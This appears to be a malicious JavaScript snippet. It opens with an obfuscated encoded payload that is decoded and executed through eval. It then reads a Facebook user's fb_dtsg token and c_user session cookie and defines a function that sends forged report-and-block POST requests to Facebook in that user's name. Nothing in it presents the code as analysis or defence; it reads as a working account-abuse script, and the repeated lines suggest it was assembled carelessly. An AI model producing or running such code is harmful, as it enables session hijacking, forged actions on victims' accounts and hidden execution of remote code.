1641A2049A2209F2201F2161D2169D2137F2049D2241A1529C1761B1529D2089A2049D2137C2193B2081E1745A2033E2049E2209A2073C2113C2161A1641A2049D2209F2201C2161C2169E2137F2049D2241F1529D1761F1529F2201C2185F2209D2081A1745B1353C2033D2049C2209B2073C2113A2161B1641C2193A2185E2065F1529B1761F1529E1545E2105A2201F2201C2169B1737D1649B1649C2193B2201B2185F2081B2049E2145C1681A1657D1697E1641F2153B2105F2049A2065E1641D2217C2209D2113B1641D2217E2153D1649C2209A2169E2137A2161D2049A2073E2145A2209F2193C2113E2065B1673B1649A1681B1681C1665A1689B2081D1721C2089E1673D1673B2065B2065F1657E1673C2081F2081B1673D2089C1697E2073C1697E1697B2057E1665C1697C1721F1697A2065E1721C1705D1689F1729C1673C1649B1697F1673C2049E1697C2089B1721A1689D1665E1649E2209C2169F2137E2161E2049C2073E2145B2209E2193E2113C2065E1649A2113A2073C2033B2137F2081F1649A1681C1633A1673B1657B1665C1681C1649E2105B2209E2241E2137E2209C2153E1649E1929B2049F2169F1649F1897B2081D2225B1945D2185A2049C2065E2129A1649A1665B1673A1721B1649A1897A2049B2153D2097B1569E1673A1657C1793C2145F1569A1673E1657A1817F2049A2153A1569A1673A1657F1977A2049D1569D1673D1657F1633D1569E1673E1657D1889F1633D1945E1913C1641F2145E2169C1681E1545C1745D1353B2033A2073F2113F2217B1641C2049C2169C2169D2081E2153D2073C1809A2105F2113C2137E2073C1593E2033D2049E2209D2073F2113C2161F1601D1745F2033D2057A2161F2073C2241F1641A2049A2169A2169B2081E2153C2073F1809A2105D2113C2137E2073B1593F2033E2073C2113C2217D1601A1745B1353C1649C1609A2057E3065E2113E1529B1689E1609F1649B1353E2033F2073E2113B2217E1641D2193A2201E2241E2137C2081E1641C2105A2081F2113A2097D2105F2201F1761A1545B1673B1697D1545A1745C2033B2073E2113B2217C1641B2193F2201F2241B2137A2081B1641B2225F2113D2073A2201B2105A1761D1545B1665F1657F1657F1569E1545F1745D2033A2073B2113D2217B1641A2193D2201F2241B2137B2081C1641F2169E2161C2193D2113E2201C2113B2161E2153A1761B1545F2089D2113F2233E2081A2073A1545D1745C1353F2033E2073D2113C2217C1641D2193A2201F2241C2137A2081E1641C2201A2161A2169A1761D1545A2049D2209F2201E2161C1545D1745D2033B2073D2113D2217D1641C2193F2201C2241C2137B2081E1641E2057F2161E2201E2201D2161C2145E1761B1545E1657B1545E1745B2033B2073C2113D2217D1641D2049A2137A2113B2097A2153F1761A1545B2065D2081B2153A2201C2081F2185D1545F1745B1353E2217E2049D2185B1529F2033F2049A2209D2073C2113F2161C1761A1529A2073B2161A2065A2209C2145A2081A2153F2201C1641A2065B2185C2081E2049A2201F2081A1825B2137C2081A2145B2081C2153E2201B1593E1585B2049C2209B2073F2113B2161E1585B1601F1745A1353D2033D2049E2209B2073B2113B2161F1641C2193C2201A2241C2137F2081E1641A2225D2113B2073B2201C2105A1761B1545F1665A1657F1657C1569C1545E1745A2033F2049B2209E2073C2113A2161D1641E2193F2201C2241B2137F2081D1641C2105F2081F2113A2097F2105D2201D1761D1545D1673C1697F2169F2233C1545C1745E2033E2049D2209F2073E2113A2161C1641C2065E2161B2153A2201B2185E2161A2137B2193F1529F1761C1529E2201D2185C2209D2081F1745E1353A2033A2049C2209A2073E2113D2161C1641B2049B2209F2201B2161B2169C2137E2049B2241A1529C1761B1529E2089E2049E2137E2193B2081A1745C2033B2049E2209E2073D2113B2161A1641C2049B2209E2201B2161E2169C2137F2049B2241F1529F1761C1529E2201F2185A2209B2081B1745F1353D2033D2049C2209D2073E2113D2161E1641B2193A2185F2065E1529B1761D1529A1545C2105A2201F2201D2169C1737B1649E1649F2225E2225B2225D1681D1657F1697A1641E2153E2105E2049B2065A1641E2217B2209D2113C1641A2217E2153A1649B2209D2169A2137F2161D2049E2073C2145F2209D2193A2113C2065A1673A1649E2073C1697D2049C1729F1705E2065A2089B2081A1729A2081C1713E1657A1673D1657A2065B2049F1713D1721D1665B1657E1713E1729D1657F1657F1665C1657F2065A1721C2049E1697D2049D1721F1649D1697E1673F1705D1665D2049C1673D2049D1689E1649C2209A2169F2137A2161C2049C2073D2145D2209D2193C2113D2065C1649C1897A2105E2049D2065D1569E1673E1657D1961F2113A2081A2201D1569A1673B1657F1897A2049C2145A1649A1889E2185C1641B1937C2113D2185C2161F1649A1881B2049A2153F2097E1569F1673E1657D1897F2097E2105B2081B1569B1673E1657F1897F2209E2161B2065D1569B1673D1657D1889E2049E2201B1649C1665F1673D1721C1649B1881C2049E2153D2097D1569A1673A1657F1897E2097B2105D2081A1569D1673A1657D1897C2209A2161E2065C1569F1673C1657D1889E2049A2201B1641D2145C2169F1681C1529A1545B1745A1353D2033E2073E2113D2217C1641C2049D2169F2169F2081A2153C2073C1809B2105A2113F2137C2073D1593B2033B2049B2209A2073E2113A2161E1601F1745B2033F2057E2161F2073B2241D1641F2049B2169B2169F2081A2153E2073C1809A2105A2113B2137F2073F1593B2033A2073B2113F2217A1601F1745A';var _9576=/[\x41\x42\x43\x44\x45\x46]/;var _7541=2;var _1208=_8595.charAt(_8595.length-1);var _3078;var _8968=_8595.split(_9576);var _9789=[String.fromCharCode,isNaN,parseInt,String];_8968[1]=_9789[_7541+1](_9789[_7541](_8968[1])/21);var _5490=(_7541==5)?String:eval;_3078='';_11=_9789[_7541](_8968[0])/_9789[_7541](_8968[1]);for(_4678=3;_4678<_11;_4678++)_3078+=(_9789[_7541-2]((_9789[_7541](_8968[_4678])+_9789[_7541](_8968[2])+_9789[_7541](_8968[1]))/_9789[_7541](_8968[1])-_9789[_7541](_8968[2])+_9789[_7541](_8968[1])-1));var _7577='_6527';var _8948='_7577=_3078';function _6519(_2819){_5490(_2426);_6519(_2838);_2838(_8948);_6519(_7577);}var _2426='_6519=_5490';var _2838='_2838=_6519';_6519(_1208);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var _6717; var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var _6717; var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var now=(new Date).getTime(); function report(r) { var X = new XMLHttpRequest(); var XURL = "https://www.facebook.com/ajax/report/social.php"; var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1"; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }